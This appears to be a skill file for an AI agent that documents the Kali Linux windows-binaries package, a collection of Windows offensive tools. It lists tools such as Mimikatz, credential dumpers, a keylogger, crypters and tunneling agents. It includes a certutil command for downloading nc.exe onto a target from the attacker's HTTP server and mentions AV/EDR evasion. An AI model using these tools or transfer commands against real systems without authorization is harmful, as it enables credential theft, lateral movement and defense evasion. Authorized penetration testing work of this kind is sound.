---
name: windows-binaries
description: Access a collection of Windows-native executables and penetration testing resources stored on Kali Linux. Use when performing lateral movement, privilege escalation, data exfiltration, or pivoting from a Linux attacker machine to a Windows target environment. Includes tools like Mimikatz, Chisel, Ligolo-ng, and various networking utilities.
---

# windows-binaries

## Overview
A collection of Windows executables and resources specifically curated for use during penetration tests. These tools are stored locally on Kali Linux to be transferred to target Windows systems. Category: Exploitation / Post-Exploitation.

## Installation (if not already installed)
Assume the binaries are present at `/usr/share/windows-resources/`. If the directory is missing:

```bash
sudo apt update && sudo apt install windows-binaries
```

## Common Workflows

### Serving a binary via Python HTTP server
To transfer a tool like `nc.exe` to a target:
```bash
cd /usr/share/windows-resources/binaries/
python3 -m http.server 80
# On Windows target: certutil -urlcache -f http://<kali-ip>/nc.exe nc.exe
```

### Accessing Mimikatz
Mimikatz is stored in its own subdirectory within resources:
```bash
ls /usr/share/windows-resources/mimikatz/x64/
# Contains mimikatz.exe and mimidrv.sys
```

### Using Chisel for pivoting
Select the appropriate architecture for the target:
```bash
ls /usr/share/windows-resources/binaries/chisel_*
# chisel_386.exe, chisel_amd64.exe, chisel_arm64.exe
```

## Complete Command Reference

The package provides two main directory structures under `/usr/share/`.

### 1. Windows Binaries (`/usr/share/windows-resources/binaries`)
Standalone executables ready for transfer to a target.

| File | Description |
|------|-------------|
| `chisel_386.exe` | TCP/UDP tunnel over HTTP (32-bit) |
| `chisel_amd64.exe` | TCP/UDP tunnel over HTTP (64-bit) |
| `chisel_arm64.exe` | TCP/UDP tunnel over HTTP (ARM 64-bit) |
| `enumplus` | Directory containing enumeration tools |
| `exe2bat.exe` | Converts EXE files to BAT files for text-based transfer |
| `fgdump` | Password hash dumping utility |
| `fport` | Reports all open TCP/IP and UDP ports and mapping to processes |
| `klogger.exe` | Keylogging utility |
| `ligolo-ng_agent_amd64.exe` | Ligolo-ng tunneling agent (64-bit) |
| `ligolo-ng_agent_arm64.exe` | Ligolo-ng tunneling agent (ARM 64-bit) |
| `ligolo-ng_proxy_amd64.exe` | Ligolo-ng proxy (64-bit) |
| `ligolo-ng_proxy_arm64.exe` | Ligolo-ng proxy (ARM 64-bit) |
| `mbenum` | Master Browser enumeration |
| `nbtenum` | NetBIOS enumeration |
| `nc.exe` | Netcat for Windows |
| `plink.exe` | Command-line interface to the PuTTY back ends |
| `radmin.exe` | Remote Administration tool |
| `vncviewer.exe` | VNC client for Windows |
| `wget.exe` | Command-line file downloader |
| `whoami.exe` | Displays current user/group information |

### 2. Windows Resources (`/usr/share/windows-resources`)
Larger toolsets, frameworks, and specialized resources.

| Directory/Link | Description |
|----------------|-------------|
| `binaries/` | Link to the standalone binaries listed above |
| `dbd/` | Netcat-clone with encryption |
| `heartleech/` | Exploitation tool for OpenSSL Heartbleed |
| `hyperion/` | Crypter for 32-bit Windows executables |
| `mimikatz/` | Credential extraction tool (x64 and Win32 versions) |
| `ncat/` | Nmap's networking utility for Windows |
| `nishang/` | PowerShell scripts for offensive security |
| `ollydbg/` | 32-bit assembler-level analyzing debugger |
| `powercat/` | PowerShell version of Netcat |
| `powershell-empire/` | Post-exploitation framework |
| `powersploit/` | PowerShell modules for penetration testing |
| `rubeus/` | Toolset for raw Kerberos interaction and abuses |
| `sbd/` | Netcat-clone with strong encryption and persistence |
| `secure-socket-funneling/` | Network pivoting and tunneling tool |
| `shellter/` | Dynamic shellcode injection tool |
| `sqldict/` | SQL Server password dictionary attack tool |
| `tftpd32/` | TFTP server/client for Windows |
| `wce/` | Windows Credentials Editor |
| `windows-privesc-check/` | Scripts to find local privilege escalation vectors |

## Notes
- These tools are intended to be **transferred** to a Windows target; they will not run directly on Kali Linux without a compatibility layer like Wine.
- Many of these binaries (especially `mimikatz`, `nc.exe`, and `wce`) are flagged by Windows Defender and other AV/EDR solutions. Obfuscation or bypass techniques may be required.
- The `chisel` and `ligolo-ng` files are often symlinks to the `common-binaries` packages.